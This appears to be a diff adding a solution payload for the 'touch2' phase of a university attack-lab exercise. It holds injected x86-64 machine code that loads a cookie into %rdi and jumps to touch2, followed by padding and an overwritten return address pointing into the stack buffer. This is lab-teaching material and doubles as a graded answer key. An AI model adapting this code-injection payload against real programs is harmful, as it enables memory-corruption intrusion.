@@ -1,0 +1,9 @@
+48 c7 c7 3d 5c 6c 61 /* mov    $0x616c5c3d,%rdi */
+68 43 1c 40 00 /* pushq $0x401c43 */
+c3 /* ret */
+/* padding */
+00 00 00 00
+00 00 00 00
+00 00 00
+D8 98 61 55 00 00 00 00 /* początek bufora: 0x556198D8 */
+43 1c 40 00 00 00 00 00 /* touch2 address */
